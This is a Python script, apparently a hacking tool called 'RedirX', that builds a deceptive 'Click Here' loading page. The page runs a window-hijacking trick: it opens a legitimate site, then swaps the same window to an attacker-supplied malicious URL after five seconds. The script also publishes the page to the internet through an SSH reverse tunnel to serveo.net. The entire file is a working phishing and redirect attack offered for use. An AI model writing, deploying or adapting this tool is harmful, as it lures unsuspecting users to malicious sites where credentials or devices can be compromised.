import os
import http.server
import socketserver
import subprocess
import threading

# Clear the screen
os.system('cls' if os.name == 'nt' else 'clear')

# RedirX Banner in light red style
banner = '''
\033[91m  
      ██▀███  ▓█████ ▓█████▄  ██▓ ██▀███  ▒██   ██▒
     ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▓██▒▓██ ▒ ██▒▒▒ █ █ ▒░
     ▓██ ░▄█ ▒▒███   ░██   █▌▒██▒▓██ ░▄█ ▒░░  █   ░
     ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌░██░▒██▀▀█▄   ░ █ █ ▒ 
     ░██▓ ▒██▒░▒████▒░▒████▓ ░██░░██▓ ▒██▒▒██▒ ▒██▒
     ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░▓  ░ ▒▓ ░▒▓░▒▒ ░ ░▓ ░
       ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒  ▒ ░  ░▒ ░ ▒░░░   ░▒ ░
       ░░   ░    ░    ░ ░  ░  ▒ ░  ░░   ░  ░    ░  
        ░        ░  ░   ░     ░     ░      ░    ░  
                       ░                             \033[0m
'''

# Print the light red banner
print(banner)

# Print the "Coded by RedirX" message in green
print("\033[92m             RedirX Coded by Anonycodexia\033[0m")

print("")

# Prompt for URLs
legit_url = input("Enter the legitimate website URL: ")
malicious_url = input("Enter the malicious website URL: ")

# HTML content with injected URLs
html_content = f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script>
        var windowJack = function() {{
            window.open('{legit_url}', 'test');  // Open the legitimate URL
            setTimeout(function() {{
                window.open('{malicious_url}', 'test');  // Open the malicious URL after 5 seconds
            }}, 5000);
        }};
    </script>
</head>
<body style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: Arial, sans-serif; margin: 0;">
    <div style="text-align: center; margin-bottom: 20px; font-size: 18px; color: #555;">
        Website is taking time to load...<br>
        Please click the button below to visit directly.
    </div>
    <button style="
        cursor: pointer;
        background: linear-gradient(145deg, #e6e6e6, #ffffff);
        border: none;
        padding: 15px 30px;
        font: bold 16px Arial, sans-serif;
        border-radius: 10px;
        box-shadow: 4px 4px 8px #aaaaaa, -4px -4px 8px #ffffff;
        color: #333;
        text-shadow: 1px 1px 2px #888;
        transition: transform 0.3s, box-shadow 0.3s;
    "
    onmouseover="this.style.transform='translateY(-3px)'; this.style.boxShadow='6px 6px 12px #aaaaaa, -6px -6px 12px #ffffff';"
    onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='4px 4px 8px #aaaaaa, -4px -4px 8px #ffffff';"
    onmousedown="this.style.transform='translateY(2px)'; this.style.boxShadow='2px 2px 4px #aaaaaa, -2px -2px 4px #ffffff';"
    onmouseup="this.style.transform='translateY(-3px)'; this.style.boxShadow='6px 6px 12px #aaaaaa, -6px -6px 12px #ffffff';"
    onclick="windowJack()">
        Click Here
    </button>
</body>
</html>
'''

# Simple HTTP server to serve the HTML
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html_content.encode())
        else:
            super().do_GET()

# Run server on localhost at port 8000
def run_server():
    with socketserver.TCPServer(("localhost", 8000), MyHandler) as httpd:
        print("Serving at http://localhost:8000")
        httpd.serve_forever()

# Function to start the Serveo SSH tunnel
def start_serveo():
    print("Starting SSH tunnel to serveo.net...")
    subprocess.run(['ssh', '-R', '80:localhost:8000', 'serveo.net'])

if __name__ == '__main__':
    # Start the HTTP server in a new thread
    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True  # Ensure it exits when the main program exits
    server_thread.start()

    # Start the Serveo tunnel
    start_serveo()
